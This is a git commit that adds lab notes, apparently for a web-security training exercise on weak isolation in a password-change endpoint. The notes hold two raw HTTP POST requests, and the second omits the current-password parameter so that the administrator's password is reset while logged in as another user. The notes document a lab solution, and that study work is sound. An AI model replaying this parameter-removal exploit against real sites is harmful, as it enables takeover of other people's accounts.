840918dc7a1c131d4bf3c60241a5b2dc21c3dd21
Pranjal <pranjalruhela2811@gmail.com>
2023-07-10 16:28:57 +0530

    after loggin in removal of parameter

---
+++ App Logic Vulns/Weak isolation on dual-use endpoint/steps.js
@@ -0,0 +1,13 @@
+/*
+
+1) login the wiener 
+POST /my-account/change-password HTTP/2
+csrf=ahYC4nZoKhqzQoXczClFwDpJKidrwPKf&username=administrator
+&current-password=peter&new-password-1=peter&new-password-2=peter
+
+
+POST /my-account/change-password HTTP/2
+csrf=ahYC4nZoKhqzQoXczClFwDpJKidrwPKf&username=administrator&new-password-1=peter
+&new-password-2=peter
+
+*/
